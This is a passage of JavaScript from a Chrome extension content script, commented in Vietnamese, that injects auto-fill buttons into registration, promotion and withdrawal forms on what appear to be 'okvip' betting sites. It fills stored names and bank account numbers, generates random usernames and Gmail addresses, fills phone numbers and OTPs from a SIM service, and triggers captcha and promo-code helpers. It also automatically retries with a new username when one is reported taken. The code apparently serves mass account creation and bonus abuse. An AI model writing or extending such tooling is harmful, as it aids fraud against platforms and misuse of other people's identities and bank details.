        const sdtBtn = document.querySelector('[data-mk-btn="okvip-btn-phone"]');
        if (sdtBtn) {
          sdtBtn.click();
          await new Promise(resolve => {
            let waited = 0;
            const check = setInterval(() => {
              waited += 500;
              const txt = document.querySelector('[data-mk-btn="okvip-btn-phone"]')?.textContent || "";
              const done = txt.includes("✅") || txt.includes("❌") || txt.includes("Hết") || waited >= 1000;
              if (done) { clearInterval(check); resolve(); }
            }, 500);
          });
        }

        await sleep(400);
        const mkBtn = document.getElementById("__mk_fill_btn__");
        if (mkBtn) {
          mkBtn.click();
          await sleep(1500);
        } else {
          const pwEl = getPasswordInput();
          if (pwEl) await typeIntoInput(pwEl, getPassword());
        }

        btn.textContent = "✅ Xong"; btn.style.background = "#2e7d32";
        setTimeout(() => { btn.innerHTML = "👤 Điền Tên"; btn.style.background = "#f60"; btn.disabled = false; }, 2000);
      });
    });

    (function injectStk() {
      if (document.getElementById("__mk_stk_btn__")) return;
      const stkEl = getStkInput();
      if (!stkEl) return;
      if (isWithdrawInput(stkEl)) return;
      if (/tên|ten|username/i.test(stkEl.placeholder || "")) return;
      const existingWrap = stkEl.closest("#__mk_stk_wrapper__");
      if (existingWrap) return;
      const parent = stkEl.parentElement;
      if (!parent) return;
      if (getComputedStyle(parent).position === "static") parent.style.position = "relative";
      parent.dataset.mkStkWrap = "1";
      stkEl.style.setProperty("padding-right", "120px", "important");
      stkEl.style.boxSizing = "border-box";

      const btn = document.createElement("button");
      btn.id = "__mk_stk_btn__";
      btn.type = "button";
      btn.innerHTML = lastSelectedAccount ? `💳 ${lastSelectedAccount.name.split(" ").pop()}` : "💳 Điền STK";
      btn.style.cssText = "position:absolute;right:4px;top:50%;transform:translateY(-50%);background:#f60;color:#fff;border:none;border-radius:6px;padding:6px 10px;cursor:pointer;font-weight:700;font-size:12px;z-index:9999;white-space:nowrap;touch-action:manipulation;";
      btn.addEventListener("mousedown", e => e.preventDefault());
      btn.addEventListener("click", async () => {
        if (!lastSelectedAccount) {
          await showPicker(async (account) => {
            setLastAccount(account);
            btn.textContent = "⌨️..."; btn.disabled = true;
            await typeIntoInput(getStkInput(), account.account);
            btn.textContent = "✅ Xong"; btn.style.background = "#2e7d32";
            setTimeout(() => { btn.innerHTML = "💳 Điền STK"; btn.style.background = "#f60"; btn.disabled = false; }, 1500);
          });
        } else {
          btn.textContent = "⌨️..."; btn.disabled = true;
          await typeIntoInput(getStkInput(), lastSelectedAccount.account);
          try { chrome.storage.local.set({[LAST_STK_KEY]: lastSelectedAccount.account}); } catch(e) {}
          btn.textContent = `✅ ${lastSelectedAccount.name}`; btn.style.background = "#2e7d32";
          setTimeout(() => { btn.innerHTML = `💳 ${lastSelectedAccount.name.split(" ").pop()}`; btn.style.background = "#f60"; btn.disabled = false; }, 1500);
        }
      });
      let holdTimer = null;
      btn.addEventListener("touchstart", () => {
        holdTimer = setTimeout(async () => {
          await showPicker(async (account) => {
            setLastAccount(account);
            btn.textContent = "⌨️..."; btn.disabled = true;
            await typeIntoInput(getStkInput(), account.account);
            btn.textContent = "✅ Xong"; btn.style.background = "#2e7d32";
            setTimeout(() => { btn.innerHTML = `💳 ${account.name.split(" ").pop()}`; btn.style.background = "#f60"; btn.disabled = false; }, 1500);
          });
        }, 600);
      }, { passive: true });
      btn.addEventListener("touchend", () => clearTimeout(holdTimer), { passive: true });
      parent.appendChild(btn);
    })();

    const _isPromoPage = (
      [...document.querySelectorAll('div.title-form')].some(el =>
        el.textContent.trim().includes('Thông tin khuyến mãi')
      ) ||
      [...document.querySelectorAll('h1,h2,h3,div,p,span')].some(el =>
        /trung tâm khuyến mãi|trung tam khuyen mai|nhập tên tài khoản|nhap ten tai khoan/i.test(el.textContent || "")
      )
    );

    (function injectUsernameBtn() {
      if (document.getElementById("__mk_user_btn__")) return;
      if (_isPromoPage) return;
      if (document.getElementById("okvip-btn-tkkm")) return;
      const _isWithdrawPage = !!(
        document.querySelector('input[formcontrolname="newPassword"]') ||
        document.querySelector('input[formcontrolname="oldPassword"]') ||
        [...document.querySelectorAll('div,h2,h3,span,p')].some(el =>
          /mã pin rút tiền|ma pin rut tien|đổi mật khẩu rút|doi mat khau rut/i.test(el.textContent||"")
        )
      );
      if (_isWithdrawPage) return;
      const userEl = getUsernameInput();
      if (!userEl) return;
      if (userEl.closest("#__mk_user_wrap__")) return;

      const wrap = document.createElement("div");
      wrap.id = "__mk_user_wrap__";
      wrap.style.cssText = "position:relative;display:block;width:100%;";
      userEl.parentNode.insertBefore(wrap, userEl);
      wrap.appendChild(userEl);
      userEl.style.setProperty("padding-right", "170px", "important");

      const mkBtn = (id, html, bg) => {
        const b = document.createElement("button");
        b.id = id; b.type = "button"; b.innerHTML = html;
        Object.assign(b.style, {
          position:"absolute", top:"50%", transform:"translateY(-50%)",
          background:bg, color:"#fff", border:"none", borderRadius:"6px",
          padding:"6px 9px", cursor:"pointer", fontWeight:"700",
          fontSize:"12px", whiteSpace:"nowrap", zIndex:"9999",
          touchAction:"manipulation"
        });
        b.addEventListener("mousedown", e => e.preventDefault());
        return b;
      };

      const btnTK   = mkBtn("__mk_user_btn__",  "🆔 Điền TK", "#1a73e8");
      const btnRand = mkBtn("__mk_user_rand__", "🎲", "#f0ad4e");
      btnTK.style.right   = "42px";
      btnRand.style.right = "4px";

      async function getNameForNick() {
        if (!lastSelectedAccount) {
          try { const v = localStorage.getItem(LAST_ACCOUNT_KEY)||sessionStorage.getItem(LAST_ACCOUNT_KEY); lastSelectedAccount = JSON.parse(v||"null"); } catch(e) {}
        }
        if (!lastSelectedAccount) {
          try { await new Promise(res => chrome.storage.local.get([LAST_NAME_KEY], s => { if(s[LAST_NAME_KEY]) lastSelectedAccount={name:s[LAST_NAME_KEY],account:""}; res(); })); } catch(e) {}
        }
        return lastSelectedAccount?.name || "Nguyen Van A";
      }

      btnTK.addEventListener("click", async () => {
        // Ưu tiên: 1) hard_username cứng  2) TK đã book lần trước (Firestore cross-domain)  3) chọn nick mới
        let hardUser = "";
        try { hardUser = localStorage.getItem("okvip_hard_username") || ""; } catch(e) {}
        if (!hardUser) {
          try { hardUser = await new Promise(res => chrome.storage.local.get(["okvip_hard_username"], s => res(s["okvip_hard_username"] || ""))); } catch(e) {}
        }

        // Lấy TK đã dùng lần trước (từ localStorage hoặc Firestore cross-domain)
        let lastUsedNick = "";
        try { lastUsedNick = localStorage.getItem(LAST_USERNAME_KEY) || ""; } catch(e) {}
        if (!lastUsedNick) {
          lastUsedNick = await loadUsernameFromFirestore();
        }

        const fillNick = hardUser || lastUsedNick;
        if (fillNick) {
          btnTK.textContent = "⌨️..."; btnTK.disabled = true;
          await typeIntoInput(userEl, fillNick);
          await new Promise(r => setTimeout(r, 300));
          const actualNick = userEl.value.trim() || fillNick;
          try { chrome.storage.local.set({[LAST_USERNAME_KEY]: actualNick}); } catch(e) {}
          try { localStorage.setItem(LAST_USERNAME_KEY, actualNick); } catch(e) {}
          saveUsernameToFirestore(actualNick);
          const confirmEl = getConfirmUsernameInput();
          if (confirmEl) await typeIntoInput(confirmEl, actualNick);
          btnTK.textContent = "✅ Xong"; btnTK.style.background = "#2e7d32";
          setTimeout(() => { btnTK.innerHTML = "🆔 Điền TK"; btnTK.style.background = "#1a73e8"; btnTK.disabled = false; }, 1500);
        } else {
          const name = await getNameForNick();
          await showNickPicker(name, async (nick) => {
            btnTK.textContent = "⌨️..."; btnTK.disabled = true;
            await typeIntoInput(userEl, nick);
            await new Promise(r => setTimeout(r, 300));
            const actualNick = userEl.value.trim() || nick;
            try { chrome.storage.local.set({[LAST_USERNAME_KEY]: actualNick}); } catch(e) {}
            try { localStorage.setItem(LAST_USERNAME_KEY, actualNick); } catch(e) {}
            saveUsernameToFirestore(actualNick);
            const confirmEl = getConfirmUsernameInput();
            if (confirmEl) await typeIntoInput(confirmEl, actualNick);
            btnTK.textContent = "✅ Xong"; btnTK.style.background = "#2e7d32";
            setTimeout(() => { btnTK.innerHTML = "🆔 Điền TK"; btnTK.style.background = "#1a73e8"; btnTK.disabled = false; }, 1500);
          });
        }
      });

      btnRand.addEventListener("click", async () => {
        btnRand.disabled = true;
        const hardUser = await getHardUsername();
        let fillVal;
        if (hardUser) {
          fillVal = hardUser;
        } else {
          const name = await getNameForNick();
          fillVal = genNickOptions(name)[Math.floor(Math.random()*genNickOptions(name).length)].value;
        }
        await typeIntoInput(userEl, fillVal);
        await new Promise(r => setTimeout(r, 300));
        const actualNick = userEl.value.trim() || fillVal;
        try { chrome.storage.local.set({[LAST_USERNAME_KEY]: actualNick}); } catch(e) {}
        try { localStorage.setItem(LAST_USERNAME_KEY, actualNick); } catch(e) {}
        const confirmEl = getConfirmUsernameInput();
        if (confirmEl) await typeIntoInput(confirmEl, actualNick);
        showToast((hardUser ? "🆔 " : "🎲 ") + actualNick, "info");
        btnRand.disabled = false;
      });

      wrap.appendChild(btnTK);
      wrap.appendChild(btnRand);

      userEl.addEventListener('change', () => {
        const val = userEl.value.trim();
        if (!val) return;
        try { chrome.storage.local.set({[LAST_USERNAME_KEY]: val}); } catch(e) {}
        try { localStorage.setItem(LAST_USERNAME_KEY, val); } catch(e) {}
      });
      userEl.addEventListener('blur', () => {
        const val = userEl.value.trim();
        if (!val) return;
        try { chrome.storage.local.set({[LAST_USERNAME_KEY]: val}); } catch(e) {}
        try { localStorage.setItem(LAST_USERNAME_KEY, val); } catch(e) {}
      });
    })();

    ;(function injectConfirmUsernameBtn() {
      if (document.getElementById("__mk_confirmtk_btn__")) return;
      const confirmEl = getConfirmUsernameInput();
      if (!confirmEl) return;
      if (confirmEl.closest("#__mk_confirmtk_wrap__")) return;

      const wrap = document.createElement("div");
      wrap.id = "__mk_confirmtk_wrap__";
      wrap.style.cssText = "position:relative;display:block;width:100%;";
      confirmEl.parentNode.insertBefore(wrap, confirmEl);
      wrap.appendChild(confirmEl);
      confirmEl.style.setProperty("padding-right", "130px", "important");

      const btnC = document.createElement("button");
      btnC.id = "__mk_confirmtk_btn__"; btnC.type = "button";
      btnC.innerHTML = "🔄 Điền Lại TK";
      Object.assign(btnC.style, {
        position:"absolute", top:"50%", transform:"translateY(-50%)", right:"4px",
        background:"#1a73e8", color:"#fff", border:"none", borderRadius:"6px",
        padding:"6px 9px", cursor:"pointer", fontWeight:"700",
        fontSize:"12px", whiteSpace:"nowrap", zIndex:"9999", touchAction:"manipulation"
      });
      btnC.addEventListener("mousedown", e => e.preventDefault());
      btnC.addEventListener("click", async () => {
        const mainEl = getUsernameInput();
        let nick = mainEl?.value?.trim() || "";
        if (!nick) {
          try { await new Promise(res => chrome.storage.local.get([LAST_USERNAME_KEY], s => { nick = s[LAST_USERNAME_KEY]||""; res(); })); } catch(e) {}
        }
        if (!nick) { showToast("⚠️ Điền TK chính trước!", "error"); return; }
        btnC.textContent = "⌨️..."; btnC.disabled = true;
        await typeIntoInput(confirmEl, nick);
        btnC.textContent = "✅ Xong"; btnC.style.background = "#2e7d32";
        setTimeout(() => { btnC.innerHTML = "🔄 Điền Lại TK"; btnC.style.background = "#1a73e8"; btnC.disabled = false; }, 1500);
      });
      wrap.appendChild(btnC);
    })();

    if (!document.getElementById("__mk_email_btn__")) {
      const emailEl = getEmailInput();
      if (emailEl && !emailEl.closest("#__mk_email_wrapper__")) {
        const w = document.createElement("div");
        w.id = "__mk_email_wrapper__";
        w.style.cssText = "position:relative;display:block;width:100%;";
        emailEl.parentNode.insertBefore(w, emailEl);
        w.appendChild(emailEl);
        emailEl.style.paddingRight = "160px";

        const btnGmail = document.createElement("button");
        btnGmail.id = "__mk_email_btn__";
        btnGmail.type = "button";
        btnGmail.innerHTML = "📧 Gmail";
        Object.assign(btnGmail.style, {
          position:"absolute", right:"42px", top:"50%", transform:"translateY(-50%)",
          background:"#ea4335", color:"#fff", border:"none", borderRadius:"6px",
          padding:"6px 10px", cursor:"pointer", fontWeight:"700", fontSize:"12px",
          zIndex:"9999", whiteSpace:"nowrap", touchAction:"manipulation"
        });
        btnGmail.addEventListener("mousedown", e => e.preventDefault());
        btnGmail.addEventListener("click", async () => {
          if (!lastSelectedAccount) {
            try {
              await new Promise(res => chrome.storage.local.get([LAST_NAME_KEY], s => {
                if (s[LAST_NAME_KEY]) lastSelectedAccount = { name: s[LAST_NAME_KEY], account: "" };
                res();
              }));
            } catch(e) {}
          }
          if (!lastSelectedAccount) lastSelectedAccount = { name: "Nguyen Van A", account: "" };
          const overlay = document.createElement("div");
          overlay.style.cssText = "position:fixed;inset:0;z-index:2147483646;background:rgba(0,0,0,0.45);display:flex;align-items:center;justify-content:center;";
          const box = document.createElement("div");
          box.style.cssText = "background:#fff;border-radius:12px;width:90vw;max-width:380px;max-height:80vh;display:flex;flex-direction:column;box-shadow:0 8px 32px rgba(0,0,0,0.25);overflow:hidden;font-family:-apple-system,Arial,sans-serif;";
          box.innerHTML = `
            <div style="padding:12px 16px;background:#ea4335;color:#fff;font-weight:700;font-size:14px;display:flex;justify-content:space-between;align-items:center;">
              📧 Chọn Gmail
              <button id="__em_close__" style="background:none;border:none;color:#fff;font-size:22px;cursor:pointer;line-height:1;">✕</button>
            </div>
            <div style="padding:6px 12px;background:#fce8e6;font-size:12px;color:#ea4335;font-weight:600;">
              👤 <b>${lastSelectedAccount.name}</b>
            </div>
            <div id="__em_list__" style="overflow-y:auto;flex:1;padding:4px 0;-webkit-overflow-scrolling:touch;"></div>
          `;
          overlay.appendChild(box);
          document.body.appendChild(overlay);
          const closeEM = () => overlay.remove();
          overlay.addEventListener("click", e => { if(e.target===overlay) closeEM(); });
          box.querySelector("#__em_close__").addEventListener("click", closeEM);
          let curOpts = genEmailOptions(lastSelectedAccount.name);
          function renderEM(opts) {
            const listEl = box.querySelector("#__em_list__");
            listEl.innerHTML = "";
            opts.forEach((o, idx) => {
              const row = document.createElement("div");
              row.style.cssText = "padding:8px 10px;border-bottom:1px solid #f0f0f0;display:flex;align-items:center;gap:8px;";
              row.innerHTML = `
                <div style="flex:1;min-width:0;">
                  <div style="font-weight:700;font-size:12px;color:#111;font-family:monospace;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;" id="__em_val_${idx}__">${o.value}</div>
                  <div style="font-size:10px;color:#999;">${o.label}</div>
                </div>
                <button data-idx="${idx}" class="__em_pick__" style="padding:5px 10px;background:#ea4335;color:#fff;border:none;border-radius:6px;font-size:12px;font-weight:700;cursor:pointer;flex-shrink:0;">✅</button>
                <button data-idx="${idx}" class="__em_rand__" style="padding:5px 8px;background:#f0ad4e;color:#fff;border:none;border-radius:6px;font-size:13px;cursor:pointer;flex-shrink:0;">🎲</button>
              `;
              listEl.appendChild(row);
            });
            listEl.querySelectorAll(".__em_pick__").forEach(b => {
              b.addEventListener("click", async () => {
                const idx = parseInt(b.dataset.idx);
                closeEM();
                btnGmail.textContent = "⌨️..."; btnGmail.disabled = true;
                await typeIntoInput(getEmailInput(), curOpts[idx].value);
                btnGmail.textContent = "✅ Xong"; btnGmail.style.background = "#2e7d32";
                setTimeout(() => { btnGmail.innerHTML = "📧 Gmail"; btnGmail.style.background = "#ea4335"; btnGmail.disabled = false; }, 1500);
              });
            });
            listEl.querySelectorAll(".__em_rand__").forEach(b => {
              b.addEventListener("click", () => {
                const idx = parseInt(b.dataset.idx);
                const fresh = genEmailOptions(lastSelectedAccount.name);
                curOpts[idx] = fresh[idx];
                const valEl = listEl.querySelector(`#__em_val_${idx}__`);
                if (valEl) valEl.textContent = curOpts[idx].value;
              });
            });
          }
          renderEM(curOpts);
        });

        const btnRandEM = document.createElement("button");
        btnRandEM.id = "__mk_email_rand__";
        btnRandEM.type = "button";
        btnRandEM.innerHTML = "🎲";
        Object.assign(btnRandEM.style, {
          position:"absolute", right:"4px", top:"50%", transform:"translateY(-50%)",
          background:"#f0ad4e", color:"#fff", border:"none", borderRadius:"6px",
          padding:"6px 8px", cursor:"pointer", fontWeight:"700", fontSize:"13px",
          zIndex:"9999", whiteSpace:"nowrap", touchAction:"manipulation"
        });
        btnRandEM.addEventListener("mousedown", e => e.preventDefault());
        btnRandEM.addEventListener("click", async () => {
          if (!lastSelectedAccount) {
            try {
              await new Promise(res => chrome.storage.local.get([LAST_NAME_KEY], s => {
                if (s[LAST_NAME_KEY]) lastSelectedAccount = { name: s[LAST_NAME_KEY], account: "" };
                res();
              }));
            } catch(e) {}
          }
          if (!lastSelectedAccount) lastSelectedAccount = { name: "Nguyen Van A", account: "" };
          const opts = genEmailOptions(lastSelectedAccount.name);
          const pick = opts[Math.floor(Math.random() * opts.length)];
          btnRandEM.disabled = true;
          await typeIntoInput(getEmailInput(), pick.value);
          showToast("📧 " + pick.value, "info");
          btnRandEM.disabled = false;
        });

        w.appendChild(btnGmail);
        w.appendChild(btnRandEM);
      }
    }

    (function injectCity() {
      if (document.getElementById("__mk_city_btn__")) return;
      const cityEl = getCityInput();
      if (!cityEl) return;
      if (cityEl.closest("#__mk_city_wrapper__")) return;

      const parent = cityEl.parentElement;
      if (!parent) return;
      if (getComputedStyle(parent).position === "static") parent.style.position = "relative";
      parent.id = parent.id || "__mk_city_wrapper__";
      cityEl.style.paddingRight = "176px";
      cityEl.style.boxSizing = "border-box";

      function openCityPicker() {
        const overlay = document.createElement("div");
        overlay.style.cssText = "position:fixed;inset:0;z-index:2147483646;background:rgba(0,0,0,0.45);display:flex;align-items:center;justify-content:center;";
        const box = document.createElement("div");
        box.style.cssText = "background:#fff;border-radius:12px;width:90vw;max-width:380px;max-height:85vh;display:flex;flex-direction:column;box-shadow:0 8px 32px rgba(0,0,0,0.25);overflow:hidden;font-family:-apple-system,Arial,sans-serif;";
        box.innerHTML = `
          <div style="padding:12px 16px;background:#6f42c1;color:#fff;font-weight:700;font-size:14px;display:flex;justify-content:space-between;align-items:center;">
            🏙️ Chọn Tỉnh / Thành phố
            <button id="__ct_close__" style="background:none;border:none;color:#fff;font-size:22px;cursor:pointer;line-height:1;">✕</button>
          </div>
          <div style="display:flex;border-bottom:2px solid #6f42c1;">
            <button id="__ct_tab63__" style="flex:1;padding:8px;background:#6f42c1;color:#fff;border:none;font-weight:700;font-size:12px;cursor:pointer;">63 tỉnh (cũ)</button>
            <button id="__ct_tab34__" style="flex:1;padding:8px;background:#e9e0ff;color:#6f42c1;border:none;font-weight:700;font-size:12px;cursor:pointer;">34 tỉnh (mới)</button>
          </div>
          <div style="padding:8px 10px;border-bottom:1px solid #eee;">
            <input id="__ct_search__" type="text" placeholder="🔍 Tìm tỉnh thành..." style="width:100%;padding:8px 10px;border:1.5px solid #ddd;border-radius:8px;font-size:13px;outline:none;box-sizing:border-box;"/>
          </div>
          <div id="__ct_list__" style="overflow-y:auto;flex:1;padding:4px 0;-webkit-overflow-scrolling:touch;"></div>
        `;
        overlay.appendChild(box);
        document.body.appendChild(overlay);

        let activeList = PROVINCES_63;
        const closeCT = () => overlay.remove();
        overlay.addEventListener("click", e => { if (e.target === overlay) closeCT(); });
        box.querySelector("#__ct_close__").addEventListener("click", closeCT);

        function renderCT(list) {
          const listEl = box.querySelector("#__ct_list__");
          listEl.innerHTML = "";
          if (!list.length) { listEl.innerHTML = `<div style="text-align:center;padding:16px;color:#aaa;font-size:13px;">Không có kết quả</div>`; return; }
          list.forEach(p => {
            const row = document.createElement("div");
            row.style.cssText = "padding:11px 14px;cursor:pointer;border-bottom:1px solid #f5f5f5;font-size:13px;font-weight:600;color:#222;";
            row.textContent = p;
            row.addEventListener("mouseenter", () => row.style.background = "#f3eeff");
            row.addEventListener("mouseleave", () => row.style.background = "");
            row.addEventListener("click", async () => {
              closeCT();
              const el = getCityInput();
              if (el) await typeIntoInput(el, p);
              showToast("🏙️ " + p, "info");
            });
            listEl.appendChild(row);
          });
        }

        function setTab(mode) {
          activeList = mode === 63 ? PROVINCES_63 : PROVINCES_34;
          box.querySelector("#__ct_tab63__").style.cssText = `flex:1;padding:8px;background:${mode===63?"#6f42c1":"#e9e0ff"};color:${mode===63?"#fff":"#6f42c1"};border:none;font-weight:700;font-size:12px;cursor:pointer;`;
          box.querySelector("#__ct_tab34__").style.cssText = `flex:1;padding:8px;background:${mode===34?"#6f42c1":"#e9e0ff"};color:${mode===34?"#fff":"#6f42c1"};border:none;font-weight:700;font-size:12px;cursor:pointer;`;
          box.querySelector("#__ct_search__").value = "";
          renderCT(activeList);
        }

        box.querySelector("#__ct_tab63__").addEventListener("click", () => setTab(63));
        box.querySelector("#__ct_tab34__").addEventListener("click", () => setTab(34));
        box.querySelector("#__ct_search__").addEventListener("input", e => {
          const kw = e.target.value.trim().toLowerCase();
          renderCT(kw ? activeList.filter(p => p.toLowerCase().includes(kw)) : activeList);
        });
        setTab(63);
      }

      const btnCity = document.createElement("button");
      btnCity.id = "__mk_city_btn__";
      btnCity.type = "button";
      btnCity.innerHTML = "🏙️ Tỉnh/TP";
      btnCity.style.cssText = "position:absolute;right:46px;top:50%;transform:translateY(-50%);background:#6f42c1;color:#fff;border:none;border-radius:6px;padding:5px 9px;cursor:pointer;font-weight:700;font-size:11px;z-index:9999;white-space:nowrap;touch-action:manipulation;max-width:90px;";
      btnCity.addEventListener("mousedown", e => e.preventDefault());
      btnCity.addEventListener("click", openCityPicker);

      const btnRandCity = document.createElement("button");
      btnRandCity.id = "__mk_city_rand__";
      btnRandCity.type = "button";
      btnRandCity.innerHTML = "🎲";
      btnRandCity.style.cssText = "position:absolute;right:4px;top:50%;transform:translateY(-50%);background:#f0ad4e;color:#fff;border:none;border-radius:6px;padding:6px 12px;cursor:pointer;font-weight:700;font-size:13px;z-index:9999;white-space:nowrap;touch-action:manipulation;";
      btnRandCity.addEventListener("mousedown", e => e.preventDefault());
      btnRandCity.addEventListener("click", async () => {
        const pick = pickRand(PROVINCES_63);
        btnRandCity.disabled = true;
        const el = getCityInput();
        if (el) await typeIntoInput(el, pick);
        showToast("🏙️ " + pick, "info");
        btnRandCity.disabled = false;
      });

      parent.appendChild(btnCity);
      parent.appendChild(btnRandCity);
    })();

    (function injectBankBranch() {
      if (document.getElementById("__mk_branch_btn__")) return;
      const branchEl = document.querySelector('input[name="customBankBranch"]');
      if (!branchEl) return;
      if (branchEl.closest("#__mk_branch_wrapper__")) return;

      const parent = branchEl.parentElement;
      if (!parent) return;
      if (getComputedStyle(parent).position === "static") parent.style.position = "relative";
      parent.id = parent.id || "__mk_branch_wrapper__";
      branchEl.style.paddingRight = "176px";
      branchEl.style.boxSizing = "border-box";

      const btnBranch = document.createElement("button");
      btnBranch.id = "__mk_branch_btn__";
      btnBranch.type = "button";
      btnBranch.innerHTML = "🏙️ Tỉnh/TP";
      btnBranch.style.cssText = "position:absolute;right:46px;top:50%;transform:translateY(-50%);background:#6f42c1;color:#fff;border:none;border-radius:6px;padding:5px 9px;cursor:pointer;font-weight:700;font-size:11px;z-index:9999;white-space:nowrap;touch-action:manipulation;max-width:90px;";
      btnBranch.addEventListener("mousedown", e => e.preventDefault());
      btnBranch.addEventListener("click", () => {
        const overlay = document.createElement("div");
        overlay.style.cssText = "position:fixed;inset:0;z-index:2147483646;background:rgba(0,0,0,0.45);display:flex;align-items:center;justify-content:center;";
        const box = document.createElement("div");
        box.style.cssText = "background:#fff;border-radius:12px;width:90vw;max-width:380px;max-height:85vh;display:flex;flex-direction:column;box-shadow:0 8px 32px rgba(0,0,0,0.25);overflow:hidden;font-family:-apple-system,Arial,sans-serif;";
        box.innerHTML = `
          <div style="padding:12px 16px;background:#6f42c1;color:#fff;font-weight:700;font-size:14px;display:flex;justify-content:space-between;align-items:center;">
            🏙️ Chọn Tỉnh / Thành phố
            <button id="__br_close__" style="background:none;border:none;color:#fff;font-size:22px;cursor:pointer;line-height:1;">✕</button>
          </div>
          <div style="display:flex;border-bottom:2px solid #6f42c1;">
            <button id="__br_tab63__" style="flex:1;padding:8px;background:#6f42c1;color:#fff;border:none;font-weight:700;font-size:12px;cursor:pointer;">63 tỉnh (cũ)</button>
            <button id="__br_tab34__" style="flex:1;padding:8px;background:#e9e0ff;color:#6f42c1;border:none;font-weight:700;font-size:12px;cursor:pointer;">34 tỉnh (mới)</button>
          </div>
          <div style="padding:8px 10px;border-bottom:1px solid #eee;">
            <input id="__br_search__" type="text" placeholder="🔍 Tìm tỉnh thành..." style="width:100%;padding:8px 10px;border:1.5px solid #ddd;border-radius:8px;font-size:13px;outline:none;box-sizing:border-box;"/>
          </div>
          <div id="__br_list__" style="overflow-y:auto;flex:1;padding:4px 0;-webkit-overflow-scrolling:touch;"></div>
        `;
        overlay.appendChild(box);
        document.body.appendChild(overlay);

        let activeList = PROVINCES_63;
        const closeOverlay = () => overlay.remove();
        overlay.addEventListener("click", e => { if (e.target === overlay) closeOverlay(); });
        box.querySelector("#__br_close__").addEventListener("click", closeOverlay);

        function renderList(list) {
          const listEl = box.querySelector("#__br_list__");
          listEl.innerHTML = "";
          if (!list.length) { listEl.innerHTML = `<div style="text-align:center;padding:16px;color:#aaa;font-size:13px;">Không có kết quả</div>`; return; }
          list.forEach(p => {
            const row = document.createElement("div");
            row.style.cssText = "padding:11px 14px;cursor:pointer;border-bottom:1px solid #f5f5f5;font-size:13px;font-weight:600;color:#222;";
            row.textContent = p;
            row.addEventListener("mouseenter", () => row.style.background = "#f3eeff");
            row.addEventListener("mouseleave", () => row.style.background = "");
            row.addEventListener("click", async () => {
              closeOverlay();
              const el = document.querySelector('input[name="customBankBranch"]');
              if (el) await typeIntoInput(el, p);
              showToast("🏙️ " + p, "info");
            });
            listEl.appendChild(row);
          });
        }

        function setTab(mode) {
          activeList = mode === 63 ? PROVINCES_63 : PROVINCES_34;
          box.querySelector("#__br_tab63__").style.cssText = `flex:1;padding:8px;background:${mode===63?"#6f42c1":"#e9e0ff"};color:${mode===63?"#fff":"#6f42c1"};border:none;font-weight:700;font-size:12px;cursor:pointer;`;
          box.querySelector("#__br_tab34__").style.cssText = `flex:1;padding:8px;background:${mode===34?"#6f42c1":"#e9e0ff"};color:${mode===34?"#fff":"#6f42c1"};border:none;font-weight:700;font-size:12px;cursor:pointer;`;
          box.querySelector("#__br_search__").value = "";
          renderList(activeList);
        }

        box.querySelector("#__br_tab63__").addEventListener("click", () => setTab(63));
        box.querySelector("#__br_tab34__").addEventListener("click", () => setTab(34));
        box.querySelector("#__br_search__").addEventListener("input", e => {
          const kw = e.target.value.trim().toLowerCase();
          renderList(kw ? activeList.filter(p => p.toLowerCase().includes(kw)) : activeList);
        });
        setTab(63);
      });

      const btnRandBranch = document.createElement("button");
      btnRandBranch.id = "__mk_branch_rand__";
      btnRandBranch.type = "button";
      btnRandBranch.innerHTML = "🎲";
      btnRandBranch.style.cssText = "position:absolute;right:4px;top:50%;transform:translateY(-50%);background:#f0ad4e;color:#fff;border:none;border-radius:6px;padding:6px 12px;cursor:pointer;font-weight:700;font-size:13px;z-index:9999;white-space:nowrap;touch-action:manipulation;";
      btnRandBranch.addEventListener("mousedown", e => e.preventDefault());
      btnRandBranch.addEventListener("click", async () => {
        const pick = pickRand(PROVINCES_63);
        btnRandBranch.disabled = true;
        const el = document.querySelector('input[name="customBankBranch"]');
        if (el) await typeIntoInput(el, pick);
        showToast("🏙️ " + pick, "info");
        btnRandBranch.disabled = false;
      });

      parent.appendChild(btnBranch);
      parent.appendChild(btnRandBranch);
    })();

    const phone = findPhoneInput();
    if (phone) {
      injectSimBtn(phone, "okvip-btn-phone", "📲 Điền SĐT", "#ff6b00", handleFillPhoneClick);

      const isVerifyStep = /\d+\*\d+/.test(phone.placeholder || "");
      if (!phone.value && isVerifyStep) {
        try {
          const sim = JSON.parse(localStorage.getItem(CURRENT_SIM_KEY) || "null");
          if (sim?.phone) {
            setTimeout(() => {
              if (!phone.value) {
                const _val = needsLeadingZero(phone) ? sim.phone : stripZero(sim.phone);
                fillInput(phone, _val);
                setTimeout(() => { if (!phone.value) fillInput(phone, sim.phone); }, 500);
              }
            }, 400);
          }
        } catch(e) {}
      }
    }

    const otp = findOtpInput();
    if (otp) injectSimBtn(otp, "okvip-btn-otp", "📨 Lấy OTP", "#28a745", handleOtpClick);
  }

  tryInjectAll();
  injectTKKMBtn();
  injectCaptchaBtn();

  // ========== AUTO RETRY USERNAME KHI BỊ TRÙNG ==========
  let _retryingUsername = false;

  const DUPE_REGEX = /tên tài khoản này đã tồn tại|tài khoản đã tồn tại|username.*exist|đã được sử dụng|already.*taken|account.*exist/i;
  const PW_FMT_REGEX = /mật khẩu sai định dạng|mat khau sai|ít nhất.*6|password.*format|password.*invalid|định dạng mật khẩu/i;

  async function checkAndRetryUsername() {
    if (_retryingUsername) return;
    const bodyText = document.body.innerText || "";

    if (DUPE_REGEX.test(bodyText)) {
      _retryingUsername = true;
      await sleep(200);
      const userEl = getUsernameInput() || document.querySelector('input[data-input-name="account"]');
      if (userEl) {
        let hardUserR = "";
        try { hardUserR = localStorage.getItem("okvip_hard_username") || ""; } catch(e) {}
        if (!hardUserR) { try { hardUserR = await new Promise(res => chrome.storage.local.get(["okvip_hard_username"], s => res(s["okvip_hard_username"] || ""))); } catch(e) {} }
        let fillVal;
        if (hardUserR) {
          fillVal = hardUserR;
        } else if (lastSelectedAccount) {
          const opts = genNickOptions(lastSelectedAccount.name);
          fillVal = opts[Math.floor(Math.random() * opts.length)].value;
        }
        if (fillVal) {
          await typeIntoInput(userEl, fillVal);
          await new Promise(r => setTimeout(r, 300));
          const actualNick = userEl.value.trim() || fillVal;
          try { chrome.storage.local.set({[LAST_USERNAME_KEY]: actualNick}); } catch(e) {}
          try { localStorage.setItem(LAST_USERNAME_KEY, actualNick); } catch(e) {}
          const confirmEl = getConfirmUsernameInput();
          if (confirmEl) await typeIntoInput(confirmEl, actualNick);
          showToast("🔄 TK trùng → đổi: " + actualNick, "info");
        }
      }
      setTimeout(() => { _retryingUsername = false; }, 3000);
      return;
    }

